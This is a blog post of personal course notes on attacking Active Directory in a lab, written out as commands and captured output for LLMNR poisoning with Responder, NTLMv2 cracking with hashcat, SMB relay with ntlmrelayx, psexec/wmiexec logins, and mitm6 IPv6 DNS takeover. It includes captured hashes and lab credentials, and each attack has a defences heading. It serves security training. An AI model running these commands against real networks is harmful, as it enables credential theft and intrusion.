---
layout: post
title:  "TCM_security_EthicalHacking Part 15_2"
author: haran
categories: [TCM , Cyber Security]
image: post_img/2021/01/01_1/tcm.png
beforetoc: "Attacking Active Directroy Initial Attack"
toc: true
---

Attacking Active Directroy Initial Attack

## Introduction

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/1.jpg)
 
 ### LLMNR Poisoning Overview
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/2.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/3.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/4.jpg)
 
 ```py
 python Responder.py -I tun0 -rdw
 ```
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/5.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/6.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/7.jpg)
 
 ```sh
 hashcat -m 5600 hashes.txt rockyou.txt
 ```
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/8.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/9.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/10.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/11.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/12.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/13.jpg)
 
 ```sh
 [SMB] NTLMv2-SSP Client   : 192.168.163.131
[SMB] NTLMv2-SSP Username : AHL-PC\ahl
[SMB] NTLMv2-SSP Hash     : ahl::AHL-PC:dfca1c30819e5a14:6A84D6D3E37C3AAC0D9EC1A8107E3C9F:010100000000000080713C10CD7AD701EEE4FD9AD83E203A0000000002000800310058003400430001001E00570049004E002D0031005A003300320033004D003400390059005600340004003400570049004E002D0031005A003300320033004D00340039005900560034002E0031005800340043002E004C004F00430041004C000300140031005800340043002E004C004F00430041004C000500140031005800340043002E004C004F00430041004C000700080080713C10CD7AD70106000400020000000800300030000000000000000100000000200000C81D1E2EC86EB9BE8D47B7D609563C27FB23F4B0AE67847CAEA742C5E5C7C4000A001000000000000000000000000000000000000900280063006900660073002F006400650073006B0074006F0070002D006D003000670030006A006C0033000000000000000000
 ```
 
 
 ### Password Cracking with hashcat
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/14.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/15.jpg)
 
 ```sh
 hashcat -m 5600 hash.txt /opt/hacktools/wordlist1/rockyou.txt --force
 ```
 
 ```sh
 hashcat -m 5600 hash.txt /opt/hacktools/wordlist1/rockyou.txt -O
 ```
 
 -O = optimize
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/16.jpg)
 
 ### LLMNR Poisoning defences
 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/17.jpg)
 
---
---

## SMB RELAY ATTACKS

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/18.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/19.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/20.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/21.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/22.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/23.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/24.jpg)

## Quick lab Update

- Turn on network discovery

## Discovering hosts with smb signing disabled

```sh
nmap --script=smb2-security-mode.nse -p445 192.168.130.0/24
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/25.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/26.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/27.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/28.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/29.jpg)

### SMB Relay Attack Demonstration

```sh
gedit /etc/responder/Responder.conf
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/30.jpg)

#### setup responder

```
responder -I eth0 -rdwv
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/31.jpg)

#### setup relay

```
ntlmrelayx.py -tf targets.txt -smb2support
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/32.jpg)

192.168.163.131 - AHL-PC - 21x trigger

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/33.jpg)

```sh
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa0166b9627286ff32395e0a7c7c611:::
ahl:1002:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::

```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/34.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/35.jpg)

### smb relay attack demon part 2

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/36.jpg)

```sh
ntlmrelayx.py -tf targets.txt -smb2support -i
```

-i = added

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/37.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/38.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/39.jpg)

```sh
nc 127.0.0.1 11000
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/40.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/41.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/42.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/43.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/44.jpg)

#### we use msfvenom to create a payload .exe file set up a meterpreter listner and get a shell in metaspolit with multi/exploit/handler
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/45.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/46.jpg)

- -c to execute some revershell or something

### smb relay attack defences

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/47.jpg)

## Gaining shell access 

 - what yo can do with the credentials you have

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/48.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/49.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/50.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/51.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/52.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/53.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/54.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/55.jpg)

- virus detected 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/56.jpg)

####  Use another tool

```sh
psexec.py marvel.local/dhoni:1234@Valimai@192.168.163.128
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/57.jpg)

```sh
wmiexec.py marvel.local/dhoni:1234@Valimai@192.168.163.128
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/58.jpg)

## IPv6 Attacks overview
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/59.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/60.jpg)

### Installing mitm6

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/61.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/62.jpg)

### Setting up LDAP

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/63.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/64.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/65.jpg)
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/66.jpg)

---
---


## ipv6 dns Takeover via mitm6

- you can see different request coming for dns  ipv6

```sh
mitm6 -d marvel.local
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/67.jpg)
#### setup ntlmrelayx.py


```sh
ntlmrelayx.py -6 -t ldaps://192.168.57.130 -wh fakewpad.marvel.local -l lootme
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/68.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/69.jpg)

#### restart this machine to do get dns resolution fast 

- then logi as normal user

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/70.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/71.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/72.jpg)

```sh
firefox domain_users_by_group.html
```

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/73.jpg)

#### sql service we setupped used here 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/74.jpg)


#### login to a machine

###### results through mitm6 
![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/75.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/76.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/77.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/78.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/79.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/80.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/81.jpg)

- we can restore the acl that is before
- roles,privileges old

https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/82.jpg)

### ipv6 Attack defenses


![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/83.jpg)

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/84.jpg)

## Other attack vectors and strategies

![dockerengine]({{ site.baseurl }}/post_img/2021/01/01_15_2/85.jpg)

http_version = metaspolit module 